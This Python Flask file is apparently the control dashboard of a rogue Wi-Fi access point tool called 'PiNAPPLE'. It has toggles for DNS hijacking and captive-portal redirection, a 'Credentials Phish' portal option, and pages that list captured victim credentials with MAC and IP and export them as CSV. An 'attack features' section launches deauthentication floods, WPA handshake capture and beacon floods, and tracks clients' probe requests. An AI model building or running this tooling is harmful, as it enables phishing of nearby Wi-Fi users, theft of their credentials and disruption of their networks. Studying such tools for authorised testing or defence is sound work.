BASE = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>PiNAPPLE &mdash; {title}</title>{css}</head><body>{nav}
<main class="main"><div class="topbar"><h1>{title}</h1>
<span style="font-size:0.75rem;color:var(--dim)" id="clk"></span></div>
<div class="content">{content}</div></main>
<script>
function uc(){{document.getElementById('clk').textContent=new Date().toLocaleString();}}
setInterval(uc,1000);uc();
async function api(url,method,body){{
  const o={{method:method||'POST',headers:{{'Content-Type':'application/json'}}}};
  if(body)o.body=JSON.stringify(body);
  const r=await fetch(url,o);return r.json();
}}
</script>{js}</body></html>"""

def page(title, content, active='', js=''):
    acts = {k: '' for k in ['ov','cl','re','cr','ap','lo','se','wl']}
    m = {'overview':'ov','clients':'cl','recon':'re','creds':'cr','ap':'ap','logs':'lo','settings':'se','wl':'wl'}
    if active in m:
        acts[m[active]] = 'active'
    return BASE.format(title=title, css=CSS, nav=NAV.format(**acts), content=content, js=js)

@app.route('/')
@require_auth
def overview():
    ap_ok = service_status('pinapple-ap')
    dhcp_ok = service_status('pinapple-dhcp')
    ng_ok = service_status('nginx')
    mon_ok = monitor_mode_active()
    clients = get_clients()
    i_on = os.path.exists(FLAG_INTERNET)
    d_on = os.path.exists(FLAG_DNS)
    p_on = os.path.exists(FLAG_PORTAL)
    uptime = subprocess.run(['uptime','-p'], capture_output=True, text=True).stdout.strip()
    ssid = read_hostapd_conf().get('ssid','PiNAPPLE')
    eth_ip = subprocess.run("ip addr show eth0|grep 'inet '|awk '{print $2}'|cut -d/ -f1",
                           shell=True, capture_output=True, text=True).stdout.strip()

    def sdot(ok): return '<span class="sdot {}"></span>'.format('on' if ok else 'off')
    def stxt(ok): return '<span style="color:var(--{})">&#9679; {}</span>'.format(
        'grn' if ok else 'red', 'Running' if ok else 'Stopped')

    c = """<div class="cards">
  <div class="card"><div class="card-title">Rogue AP</div>
    <div class="scrd">{ap_d}{ap_t}</div><div class="card-sub">SSID: {ssid}</div></div>
  <div class="card"><div class="card-title">DHCP/DNS</div>
    <div class="scrd">{dh_d}{dh_t}</div><div class="card-sub">dnsmasq</div></div>
  <div class="card"><div class="card-title">Portal (nginx)</div>
    <div class="scrd">{ng_d}{ng_t}</div><div class="card-sub">nginx</div></div>
  <div class="card"><div class="card-title">Monitor</div>
    <div class="scrd">{mn_d}{mn_t}</div><div class="card-sub">wlan1</div></div>
  <div class="card"><div class="card-title">Clients</div>
    <div class="card-value">{cc}</div><div class="card-sub">connected</div></div>
  <div class="card"><div class="card-title">Uptime</div>
    <div class="card-value" style="font-size:0.9rem;padding-top:8px">{up}</div>
    <div class="card-sub">{ip}</div></div>
</div>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
<div>
<div class="sh"><span class="st">Network Controls</span></div>
<div class="tg"><div class="tl"><strong>Internet Passthrough</strong><span>NAT wlan0 &rarr; eth0</span></div>
  <button class="tbtn {ic}" onclick="tog('internet',this)">{it}</button></div>
<div class="tg"><div class="tl"><strong>DNS Hijack</strong><span>Redirect all DNS to portal</span></div>
  <button class="tbtn {dc}" onclick="tog('dns-hijack',this)">{dt}</button></div>
<div class="tg"><div class="tl"><strong>Portal Redirect</strong><span>Redirect HTTP/HTTPS to portal</span></div>
  <button class="tbtn {pc}" onclick="tog('portal-redirect',this)">{pt}</button></div>
</div>
<div>
<div class="sh"><span class="st">Interfaces</span></div>
<div class="twrap"><table>
<tr><th>Interface</th><th>IP</th><th>Status</th></tr>
<tr><td>eth0</td><td>{eip}</td><td><span class="badge bg">UP</span></td></tr>
<tr><td>wlan0</td><td>10.0.0.1</td><td><span class="badge {apb}">{aps}</span></td></tr>
<tr><td>wlan1</td><td>&mdash;</td><td><span class="badge {mnb}">{mns}</span></td></tr>
</table></div>
</div></div>""".format(
        ap_d=sdot(ap_ok), ap_t=stxt(ap_ok), ssid=ssid,
        dh_d=sdot(dhcp_ok), dh_t=stxt(dhcp_ok),
        ng_d=sdot(ng_ok), ng_t=stxt(ng_ok),
        mn_d=sdot(mon_ok), mn_t=stxt(mon_ok),
        cc=len(clients), up=uptime, ip=eth_ip,
        ic='ton' if i_on else 'toff', it='ON' if i_on else 'OFF',
        dc='ton' if d_on else 'toff', dt='ON' if d_on else 'OFF',
        pc='ton' if p_on else 'toff', pt='ON' if p_on else 'OFF',
        eip=eth_ip,
        apb='bg' if ap_ok else 'br', aps='AP' if ap_ok else 'DOWN',
        mnb='bb' if mon_ok else 'br', mns='MONITOR' if mon_ok else 'DOWN')

    js = """<script>
async function tog(f,btn){
  const on=btn.classList.contains('ton');
  const act=on?'off':'on';
  const r=await api('/api/toggle/'+f,'POST',{action:act});
  if(r.ok){btn.textContent=act==='on'?'ON':'OFF';btn.className='tbtn '+(act==='on'?'ton':'toff');}
  else alert('Error: '+(r.error||'unknown'));
}
</script>"""
    return page('Overview', c, 'overview', js)

@app.route('/api/toggle/<feature>', methods=['POST'])
@require_auth
def api_toggle(feature):
    data = request.json or {}
    action = data.get('action', 'on')
    try:
        if feature == 'internet':
            subprocess.run(['/usr/local/bin/pinapple-internet', action], check=True)
            if action == 'on':
                open(FLAG_INTERNET, 'w').close()
            else:
                try: os.remove(FLAG_INTERNET)
                except: pass
        elif feature == 'dns-hijack':
            hc = '/etc/pinapple/dnsmasq-hijack.conf'
            if action == 'on':
                with open(hc, 'w') as f: f.write('address=/#/10.0.0.1\n')
                open(FLAG_DNS, 'w').close()
            else:
                with open(hc, 'w') as f: f.write('# DNS hijack disabled\n')
                try: os.remove(FLAG_DNS)
                except: pass
            subprocess.run(['systemctl', 'restart', 'pinapple-dhcp'])
        elif feature == 'portal-redirect':
            subprocess.run(['/usr/local/bin/pinapple-portal', action], check=True)
        else:
            return jsonify({'ok': False, 'error': 'unknown feature'})
        return jsonify({'ok': True, 'action': action})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)})

@app.route('/clients')
@require_auth
def clients_page():
    clients = get_clients()
    rows = ''.join('<tr><td><code>{}</code></td><td>{}</td><td>{}</td><td>{}</td></tr>'.format(
        c['mac'], c['ip'], c['hostname'], c['expires']) for c in clients)
    if not rows:
        rows = '<tr><td colspan="4" style="text-align:center;color:var(--dim)">No clients</td></tr>'
    c = """<div class="sh"><span class="st">Connected Clients ({})</span>
<span style="font-size:0.75rem;color:var(--dim)">Auto-refresh 10s</span></div>
<div class="twrap"><table><thead><tr><th>MAC</th><th>IP</th><th>Hostname</th><th>Expires</th></tr></thead>
<tbody id="ct">{}</tbody></table></div>""".format(len(clients), rows)
    js = """<script>
async function rc(){
  const r=await fetch('/api/clients');const d=await r.json();
  const t=document.getElementById('ct');
  if(!d.length){t.innerHTML='<tr><td colspan="4" style="text-align:center;color:var(--dim)">No clients</td></tr>';return;}
  t.innerHTML=d.map(c=>'<tr><td><code>'+c.mac+'</code></td><td>'+c.ip+'</td><td>'+c.hostname+'</td><td>'+c.expires+'</td></tr>').join('');
}
setInterval(rc,10000);
</script>"""
    return page('Clients', c, 'clients', js)

@app.route('/api/clients')
@require_auth
def api_clients():
    return jsonify(get_clients())

@app.route('/recon')
@require_auth
def recon_page():
    networks = get_recon()
    def eb(enc):
        m = {'Open':'br','WEP':'bw','WPA':'bb','WPA2':'bg'}
        return '<span class="badge {}">{}</span>'.format(m.get(enc,'bb'), enc)
    rows = ''.join('<tr><td>{}</td><td><code style="font-size:0.75rem">{}</code></td><td>{}</td><td>{} dBm</td><td>{}</td><td style="font-size:0.75rem;color:var(--dim)">{}</td></tr>'.format(
        n.get('ssid','') or '&lt;hidden&gt;', n.get('bssid',''), n.get('channel',0),
        n.get('signal',0), eb(n.get('encryption','Open')), n.get('first_seen',''))
        for n in sorted(networks, key=lambda x: x.get('signal',0), reverse=True))
    if not rows:
        rows = '<tr><td colspan="6" style="text-align:center;color:var(--dim)">Scanning...</td></tr>'
    c = """<div class="sh"><span class="st">Nearby Networks ({})</span>
<span style="font-size:0.75rem;color:var(--dim)">Auto-refresh 30s</span></div>
<div class="twrap"><table><thead><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Signal</th><th>Enc</th><th>First Seen</th></tr></thead>
<tbody id="rt">{}</tbody></table></div>""".format(len(networks), rows)
    js = """<script>
async function rr(){
  const r=await fetch('/api/recon');const d=await r.json();
  const mc={Open:'br',WEP:'bw',WPA:'bb',WPA2:'bg'};
  const t=document.getElementById('rt');
  if(!d.length){t.innerHTML='<tr><td colspan="6" style="text-align:center;color:var(--dim)">Scanning...</td></tr>';return;}
  t.innerHTML=[...d].sort((a,b)=>b.signal-a.signal).map(n=>'<tr><td>'+(n.ssid||'&lt;hidden&gt;')+'</td><td><code style="font-size:0.75rem">'+(n.bssid||'')+'</code></td><td>'+(n.channel||0)+'</td><td>'+(n.signal||0)+' dBm</td><td><span class="badge '+(mc[n.encryption]||'bb')+'">'+(n.encryption||'?')+'</span></td><td style="font-size:0.75rem;color:var(--dim)">'+(n.first_seen||'')+'</td></tr>').join('');
}
setInterval(rr,30000);
</script>"""
    return page('Recon', c, 'recon', js)

@app.route('/api/recon')
@require_auth
def api_recon():
    return jsonify(get_recon())

@app.route('/creds')
@require_auth
def creds_page():
    entries = get_creds()
    def fd(e):
        return ', '.join('{}:{}'.format(k,v) for k,v in e.get('data',{}).items())
    rows = ''.join('<tr><td style="font-size:0.75rem">{}</td><td>{}</td><td><code style="font-size:0.75rem">{}</code></td><td><span class="badge bb">{}</span></td><td style="font-size:0.8rem">{}</td></tr>'.format(
        e.get('timestamp',''), e.get('client_ip',''), e.get('client_mac',''),
        e.get('portal_type',''), fd(e)) for e in entries)
    if not rows:
        rows = '<tr><td colspan="5" style="text-align:center;color:var(--dim)">No credentials captured yet</td></tr>'
    c = """<div class="sh"><span class="st">Captured Credentials ({})</span>
<a href="/api/creds/export" class="btn btn-outline" style="font-size:0.8rem">Export CSV</a></div>
<div class="twrap"><table><thead><tr><th>Timestamp</th><th>IP</th><th>MAC</th><th>Type</th><th>Data</th></tr></thead>
<tbody>{}</tbody></table></div>""".format(len(entries), rows)
    return page('Credentials', c, 'creds')

@app.route('/api/creds/export')
@require_auth
def export_creds():
    entries = get_creds()
    output = io.StringIO()
    w = csv.writer(output)
    w.writerow(['timestamp','client_ip','client_mac','portal_type','data'])
    for e in entries:
        w.writerow([e.get('timestamp',''), e.get('client_ip',''),
                   e.get('client_mac',''), e.get('portal_type',''),
                   json.dumps(e.get('data',{}))])
    output.seek(0)
    return Response(output.getvalue(), mimetype='text/csv',
                   headers={'Content-Disposition': 'attachment; filename=pinapple_creds.csv'})

@app.route('/ap-control', methods=['GET','POST'])
@require_auth
def ap_control():
    msg = ''
    if request.method == 'POST':
        action = request.form.get('action')
        if action == 'start':
            r = subprocess.run(['systemctl','start','pinapple-ap'], capture_output=True, text=True)
            msg = '<span style="color:var(--grn)">AP started.</span>' if r.returncode == 0 else '<span style="color:var(--red)">Error: {}</span>'.format(r.stderr)
        elif action == 'stop':
            r = subprocess.run(['systemctl','stop','pinapple-ap'], capture_output=True, text=True)
            msg = '<span style="color:var(--warn)">AP stopped.</span>' if r.returncode == 0 else '<span style="color:var(--red)">Error: {}</span>'.format(r.stderr)
        elif action == 'config':
            ssid = request.form.get('ssid','PiNAPPLE')[:32]
            channel = int(request.form.get('channel',6))
            mode = request.form.get('mode','open')
            txpower = request.form.get('txpower','medium')
            write_hostapd_conf(ssid, channel, mode, txpower)
            subprocess.run(['systemctl','restart','pinapple-ap'])
            msg = '<span style="color:var(--grn)">Config updated and AP restarted.</span>'

    cfg = read_hostapd_conf()
    ap_run = service_status('pinapple-ap')
    try:
        with open(HOSTAPD_CONF) as f:
            raw = f.read()
    except:
        raw = '# not found'

    opts = ''.join('<option value="{}" {}>{}</option>'.format(
        i, 'selected' if str(i)==cfg.get('channel','6') else '', i) for i in range(1,14))

    mn = '<div style="padding:12px;background:rgba(0,212,170,0.1);border-radius:8px;margin-bottom:16px">{}</div>'.format(msg) if msg else ''
    c = """{mn}<div style="display:grid;grid-template-columns:1fr 1fr;gap:24px">
<div>
<div class="sh"><span class="st">AP Configuration</span></div>
<div class="card">
<form method="POST"><input type="hidden" name="action" value="config">
<div class="fr">
  <div class="fg"><label>SSID</label><input name="ssid" value="{ssid}" maxlength="32"></div>
  <div class="fg"><label>Channel</label><select name="channel">{opts}</select></div>
</div>
<div class="fr">
  <div class="fg"><label>Mode</label><select name="mode">
    <option value="open">Open</option><option value="wpa2">WPA2-PSK</option>
  </select></div>
  <div class="fg"><label>TX Power</label><select name="txpower">
    <option value="low">Low</option><option value="medium" selected>Medium</option><option value="high">High</option>
  </select></div>
</div>
<button type="submit" class="btn btn-acc">Apply &amp; Restart</button>
</form>
<div style="margin-top:16px;display:flex;gap:8px">
<form method="POST" style="display:inline"><input type="hidden" name="action" value="start">
  <button class="btn btn-outline">&#9654; Start</button></form>
<form method="POST" style="display:inline"><input type="hidden" name="action" value="stop">
  <button class="btn btn-danger">&#9632; Stop</button></form>
</div></div></div>
<div>
<div class="sh"><span class="st">Status</span>
  <span class="badge {apb}">{aps}</span></div>
<div class="card"><div class="card-title">hostapd.conf</div>
<pre style="font-size:0.75rem;color:var(--dim);margin-top:8px;line-height:1.6;overflow-x:auto">{raw}</pre>
</div></div></div>""".format(mn=mn, ssid=cfg.get('ssid','PiNAPPLE'), opts=opts, raw=raw,
                              apb='bg' if ap_run else 'br', aps='Running' if ap_run else 'Stopped')
    return page('AP Control', c, 'ap')

@app.route('/logs')
@require_auth
def logs_page():
    c = """<div class="sh"><span class="st">System Logs</span>
<select id="ls" onchange="ul()" style="background:var(--card);border:1px solid var(--bdr);color:var(--txt);padding:6px 12px;border-radius:6px">
  <option value="all">All Logs</option>
  <option value="dnsmasq">dnsmasq</option>
  <option value="creds">credentials</option>
  <option value="scan">scanner</option>
</select></div>
<div class="log-area" id="la">Loading...</div>"""
    js = """<script>
async function ul(){
  const s=document.getElementById('ls').value;
  const r=await fetch('/api/logs?source='+s);const d=await r.json();
  const a=document.getElementById('la');
  a.innerHTML=d.lines.map(l=>{
    let c='li';const ll=l.toLowerCase();
    if(ll.includes('error')||ll.includes('fail'))c='le';
    else if(ll.includes('warn'))c='lw';
    else if(ll.includes('debug'))c='ld';
    return '<span class="'+c+'">'+l.replace(/</g,'&lt;')+'</span>';
  }).join('\\n');
  a.scrollTop=a.scrollHeight;
}
setInterval(ul,5000);ul();
</script>"""
    return page('Logs', c, 'logs', js)

@app.route('/api/logs')
@require_auth
def api_logs():
    source = request.args.get('source','all')
    files = {
        'all': glob.glob(LOG_DIR + '/*.log'),
        'dnsmasq': [LOG_DIR + '/dnsmasq.log'],
        'creds': [CREDS_LOG],
        'scan': [LOG_DIR + '/scanner.log'],
    }.get(source, [])
    lines = []
    for fp in files:
        try:
            r = subprocess.run(['tail','-n','50',fp], capture_output=True, text=True)
            lines.extend(r.stdout.splitlines())
        except:
            pass
    return jsonify({'lines': lines[-100:]})

@app.route('/settings', methods=['GET','POST'])
@require_auth
def settings_page():
    msg = ''
    cfg = load_config()
    if request.method == 'POST':
        action = request.form.get('action')
        if action == 'portal_type':
            pt = request.form.get('portal_type','creds')
            src = '/opt/pinapple/portal/{}.html'.format(pt)
            if os.path.exists(src):
                if os.path.lexists(ACTIVE_PORTAL):
                    os.remove(ACTIVE_PORTAL)
                os.symlink(src, ACTIVE_PORTAL)
                cfg['portal_type'] = pt
                save_config(cfg)
                subprocess.run(['systemctl','reload','nginx'])
                msg = '<span style="color:var(--grn)">Portal set to {}</span>'.format(pt)
        elif action == 'password':
            pw = request.form.get('new_password','')
            if len(pw) >= 6:
                cfg['password_hash'] = generate_password_hash(pw)
                save_config(cfg)
                msg = '<span style="color:var(--grn)">Password updated.</span>'
            else:
                msg = '<span style="color:var(--red)">Password must be at least 6 chars.</span>'

    portals = [('creds','Credentials Phish','Email + password'),
               ('hotel','Hotel Portal','Room + last name'),
               ('splash','Splash Page','Terms only')]
    popts = ''.join("""<label style="display:flex;align-items:center;gap:12px;padding:12px;border:1px solid var(--{bdr});border-radius:8px;cursor:pointer">
<input type="radio" name="portal_type" value="{p}" {chk}>
<div><div style="font-weight:500">{n}</div><div style="font-size:0.75rem;color:var(--dim)">{d}</div></div>
</label>""".format(p=p, n=n, d=d,
                   bdr='acc' if cfg.get('portal_type')==p else 'bdr',
                   chk='checked' if cfg.get('portal_type')==p else '')
        for p,n,d in portals)

    mn = '<div style="padding:12px;background:rgba(0,212,170,0.1);border-radius:8px;margin-bottom:16px">{}</div>'.format(msg) if msg else ''
    c = """{mn}<div style="display:grid;grid-template-columns:1fr 1fr;gap:24px">
<div>
<div class="sh"><span class="st">Portal Type</span></div>
<div class="card">
<form method="POST"><input type="hidden" name="action" value="portal_type">
<div style="display:flex;flex-direction:column;gap:8px;margin-bottom:16px">{popts}</div>
<button type="submit" class="btn btn-acc">Save Portal Type</button>
</form></div></div>
<div>
<div class="sh"><span class="st">Security</span></div>
<div class="card">
<form method="POST"><input type="hidden" name="action" value="password">
<div class="fg" style="margin-bottom:16px">
  <label>New Dashboard Password</label>
  <input type="password" name="new_password" placeholder="Min 6 characters">
</div>
<button type="submit" class="btn btn-acc">Change Password</button>
</form></div></div></div>""".format(mn=mn, popts=popts)
    return page('Settings', c, 'settings')


# ============================================================
# WLAN1 ATTACK FEATURES
# ============================================================
import uuid, glob as _glob, signal as _signal

PROBES_LOG   = '/var/log/pinapple/probes.json'
TRACKER_LOG  = '/var/log/pinapple/clients_seen.json'
BEACON_PID   = '/var/run/pinapple-beacon.pid'
BEACON_SSIDS = '/etc/pinapple/beacon_ssids.txt'
PCAP_DIR     = '/var/log/pinapple'

_hs_jobs = {}  # job_id -> {'status','output','pcap'}
_beacon_proc = [None]

def get_probes():
    out = []
    try:
        with open(PROBES_LOG) as f:
            for line in f:
                try: out.append(json.loads(line.strip()))
                except: pass
    except: pass
    return out

def get_tracker():
    out = []
    try:
        with open(TRACKER_LOG) as f:
            for line in f:
                try: out.append(json.loads(line.strip()))
                except: pass
    except: pass
    return sorted(out, key=lambda x: x.get('last_seen',''), reverse=True)

# ---- API ----

@app.route('/api/probes')
@require_auth
def api_probes():
    return jsonify(sorted(get_probes(), key=lambda x: x.get('last_seen',''), reverse=True))

@app.route('/api/tracker')
@require_auth
def api_tracker():
    return jsonify(get_tracker())

@app.route('/api/wlan1/deauth', methods=['POST'])
@require_auth
def api_deauth():
    d = request.json or {}
    bssid  = d.get('bssid','').strip()
    client = d.get('client','FF:FF:FF:FF:FF:FF').strip() or 'FF:FF:FF:FF:FF:FF'
    count  = int(d.get('count', 64))
    if not bssid:
        return jsonify({'ok': False, 'error': 'bssid required'})
    count = max(1, min(count, 500))
    try:
        r = subprocess.run(
            ['python3', '/usr/local/bin/pinapple-deauth', bssid, client, str(count), 'wlan1'],
            capture_output=True, text=True, timeout=60)
        output = r.stdout + r.stderr
        return jsonify({'ok': r.returncode == 0, 'output': output})
    except subprocess.TimeoutExpired:
        return jsonify({'ok': False, 'error': 'timeout'})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)})

@app.route('/api/wlan1/handshake', methods=['POST'])
@require_auth
def api_handshake_start():
    d = request.json or {}
    bssid   = d.get('bssid','').strip()
    channel = str(d.get('channel', 6))
    client  = d.get('client','FF:FF:FF:FF:FF:FF').strip() or 'FF:FF:FF:FF:FF:FF'
    if not bssid:
        return jsonify({'ok': False, 'error': 'bssid required'})
    job_id = uuid.uuid4().hex[:8]
    pcap_path = f'{PCAP_DIR}/hs_{job_id}.pcap'
    _hs_jobs[job_id] = {'status': 'running', 'output': '', 'pcap': None}

    def run():
        try:
            r = subprocess.run(
                ['python3', '/usr/local/bin/pinapple-handshake',
                 bssid, channel, pcap_path, client],
                capture_output=True, text=True, timeout=45)
            output = r.stdout + r.stderr
            if r.returncode == 0 and os.path.exists(pcap_path):
                _hs_jobs[job_id] = {'status': 'success', 'output': output,
                                    'pcap': f'hs_{job_id}.pcap'}
            else:
                _hs_jobs[job_id] = {'status': 'failed', 'output': output, 'pcap':
                                    f'hs_{job_id}.pcap' if os.path.exists(pcap_path) else None}
        except subprocess.TimeoutExpired:
            _hs_jobs[job_id] = {'status': 'timeout', 'output': 'Timed out after 45s', 'pcap': None}
        except Exception as e:
            _hs_jobs[job_id] = {'status': 'error', 'output': str(e), 'pcap': None}

    import threading
    threading.Thread(target=run, daemon=True).start()
    return jsonify({'ok': True, 'job_id': job_id})

@app.route('/api/wlan1/handshake/<job_id>')
@require_auth
def api_handshake_status(job_id):
    job = _hs_jobs.get(job_id)
    if not job:
        return jsonify({'ok': False, 'error': 'unknown job'})
    return jsonify({'ok': True, **job})

@app.route('/api/wlan1/beacon-flood/start', methods=['POST'])
@require_auth
def api_beacon_start():
    d = request.json or {}
    ssids = d.get('ssids', [])
    if not ssids:
        return jsonify({'ok': False, 'error': 'ssids list required'})
    # Stop existing
    if _beacon_proc[0] and _beacon_proc[0].poll() is None:
        _beacon_proc[0].terminate()
    # Write ssids file
    with open(BEACON_SSIDS, 'w') as f:
        f.write('\n'.join(ssids[:50]))
    proc = subprocess.Popen(
        ['python3', '/usr/local/bin/pinapple-beacon-flood', BEACON_SSIDS, 'wlan1'],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    _beacon_proc[0] = proc
    with open(BEACON_PID, 'w') as f:
        f.write(str(proc.pid))
    return jsonify({'ok': True, 'pid': proc.pid, 'ssid_count': len(ssids)})

@app.route('/api/wlan1/beacon-flood/stop', methods=['POST'])
@require_auth
def api_beacon_stop():
    stopped = False
    if _beacon_proc[0] and _beacon_proc[0].poll() is None:
        _beacon_proc[0].terminate()
        stopped = True
    try:
        with open(BEACON_PID) as f:
            pid = int(f.read().strip())
        os.kill(pid, 15)
        stopped = True
    except:
        pass
    try: os.remove(BEACON_PID)
    except: pass
    return jsonify({'ok': True, 'stopped': stopped})

@app.route('/api/wlan1/beacon-flood/status')
@require_auth
def api_beacon_status():
    running = False
    pid = None
    if _beacon_proc[0] and _beacon_proc[0].poll() is None:
        running = True
        pid = _beacon_proc[0].pid
    else:
        try:
            with open(BEACON_PID) as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)
            running = True
        except:
            pass
    ssids = []
    try:
        with open(BEACON_SSIDS) as f:
            ssids = [l.strip() for l in f if l.strip()]
    except:
        pass
    return jsonify({'running': running, 'pid': pid, 'ssids': ssids})

@app.route('/api/wlan1/pcap/<filename>')
@require_auth
def api_pcap_download(filename):
    # Security: only allow hs_*.pcap filenames
    import re
    if not re.match(r'^hs_[a-f0-9]{8}\.pcap$', filename):
        return Response('Invalid filename', 403)
    fpath = os.path.join(PCAP_DIR, filename)
    if not os.path.exists(fpath):
        return Response('Not found', 404)
    with open(fpath, 'rb') as f:
        data = f.read()
    return Response(data, mimetype='application/octet-stream',
                   headers={'Content-Disposition': f'attachment; filename={filename}'})

